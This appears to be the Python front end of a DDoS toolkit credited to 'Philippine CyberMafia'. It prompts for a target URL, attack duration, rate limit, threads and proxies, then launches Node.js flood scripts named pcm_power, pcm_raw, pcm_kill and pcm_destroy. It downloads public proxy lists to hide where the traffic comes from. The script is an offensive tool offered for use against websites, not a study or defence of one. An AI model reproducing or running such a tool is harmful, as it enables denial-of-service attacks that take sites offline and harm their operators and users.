#Philippine CyberMafia
#Vend3ttA and K4L4SAG
import sys
import os
import time
from subprocess import run


try:
    request = __import__("httpx")
    from colorama import Fore
    from rich.console import Console
except Exception:
    exit("Error! something went wrong please run (bash install.sh)")

def check_os():
    os.system('clear' if os.name == 'windows' else 'cls')

    
def logo():
    check_os()
    if len(sys.argv) < 2:
        print(Fore.RED+"""
 ╔═╗╔═╗╔╦╗  ╔═╗╔╦╗╦═╗╦╦╔═╔═╗╦═╗
 ╠═╝║  ║║║  ╚═╗ ║ ╠╦╝║╠╩╗║╣ ╠╦╝
 ╩  ╚═╝╩ ╩  ╚═╝ ╩ ╩╚═╩╩ ╩╚═╝╩╚═
Created by Vend3ttA and K4L4S4G          """)
        
def attack_panel():
    print("""
╔═╗╔═╗╔╦╗  ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔═╗╦  
╠═╝║  ║║║  ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╠═╝╠═╣║║║║╣ ║  
╩  ╚═╝╩ ╩  ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╩  ╩ ╩╝╚╝╚═╝╩═╝
          """)
    
def methods():
    logo()
    check_os()
    print(Fore.RED+"""
 ╔╦╗╔═╗╔╦╗╦ ╦╔═╗╔╦╗╔═╗
 ║║║║╣  ║ ╠═╣║ ║ ║║╚═╗
 ╩ ╩╚═╝ ╩ ╩ ╩╚═╝═╩╝╚═╝
╔═════════════════════════╗
║ 1.pcm_power             ║
║ 2.pcm_raw               ║
║ 3.pcm_kill              ║
║ 4.pcm_destroy           ║
║                         ║
║                         ║
╚═════════════════════════╝
    """)
    print("Choose methods")
    attack_methods = input("pcm@administrator#~> ")
    if attack_methods in ['1', 'pcm_power', 'PCM_POWER']:
        try:
            check_os()
            attack_panel()
            target_url = input("pcm@administrator#~>Target: ")
            seconds = int(input("pcm@administrator#~>Time: "))
            rtl = int(input("pcm@administrator#~>RateLimit: "))
            thrds = int(input("pcm@administrator#~>Threads(5-10): "))
            pr = input("pcm@administrator#~>ProxyList: ")
            check_os()
            os.system("ulimit -n 999999 && ulimit -n 999999 && ulimit -n 999999 && ulimit -n 999999 && ulimit -n 999999 && ulimit -n 999999 && clear && clear")
            os.system(f'node methods/pcm_power.js {target_url} {seconds} {rtl} {thrds} {pr}')
        except:
            exit("Something went wrong, please  try again.")

    elif attack_methods in ['2', 'pcm_raw', 'PCM_RAW']:
        try:
            check_os()
            attack_panel()
            mode = input("pcm@administrator#~>Mode(GET/POST): ")
            target_url = input("pcm@administrator#~>Target: ")
            proxies = input("pcm@administrator#~>Proxy: ")
            dur = input("pcm@administrator#~>Seconds: ")
            r = input("pcm@administrator#~>RateLimit: ")
            th = input("pcm@administrator#~>Threads(5-10): ")
            os.system("ulimit -n 999999 && ulimit -n 999999 && ulimit -n 999999 && ulimit -n 999999 && ulimit -n 999999 && ulimit -n 999999 && clear && clear")
            os.system(f"node methods/pcm_raw.js {mode} {target_url} {proxies} {dur} {r} {th}")
        except:
            exit("Something went wrong, Please try again!")
    elif attack_methods in ['3', 'pcm_kill', 'PCM_KILL']:
        try:
            check_os()
            attack_panel()
            target = input("pcm@administrator#~>Target: ")
            durs = int(input("pcm@administrator#~>Seconds: "))
            req = int(input("pcm@administrator#~>Request: "))
            thr = int(input("pcm@administrator#~>Threads(5-10): "))
            pro = input("pcm@administrator#~>Proxy: ")
            os.system("ulimit -n 999999 && ulimit -n 999999 && ulimit -n 999999 && ulimit -n 999999 && ulimit -n 999999 && ulimit -n 999999 && clear && clear")
            os.system(f"node methods/pcm_kill.js {target} {durs} {req} {thr} {pro}")
        except:
            exit("Something went wrong, Please try again!")
    elif attack_methods in ['4', 'pcm_destroy', 'PCM_DESTROY']:
        try:
            check_os()
            attack_panel()
            target = input("pcm@administrator#~>Target: ")
            time = int(input("pcm@administrator#~>Time: "))
            threads = int(input("pcm@administrator#~>Threads: "))
            proxy = input("pcm@administrator#~>Proxy: ")
            os.system("ulimit -n 999999 && ulimit -n 999999 && ulimit -n 999999 && ulimit -n 999999 && ulimit -n 999999 && ulimit -n 999999 && clear && clear")
            os.system(f"node methods/pcm_destroy.js {target} {time} {threads} {proxy}")
        except:
            exit("Something went wrong, Please try again!")
                       
def getProxy():
    logo()
    getpr = input(Fore.RED+"[INFO] Do you want to get some proxies?(yes/no): ")
    console = Console()
    if getpr == 'yes' or getpr == 'y' or getpr == 'YES' or getpr == 'Y':
        with console.status("[bold green]Downloading some proxies please wait..") as status:
            print("Checking proxy providers....")
            time.sleep(2)
            os.system('rm -rf http.txt')
            os.system('rm -rf socks5.txt')
            os.system('wget https://proxyspace.pro/http.txt')
            os.system('wget https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt')
            print("Done Lets Proceed")
        methods()
    else:
        print("Ok, Lets Proceed")
        check_os()
        #logo()
        methods()

     
getProxy()
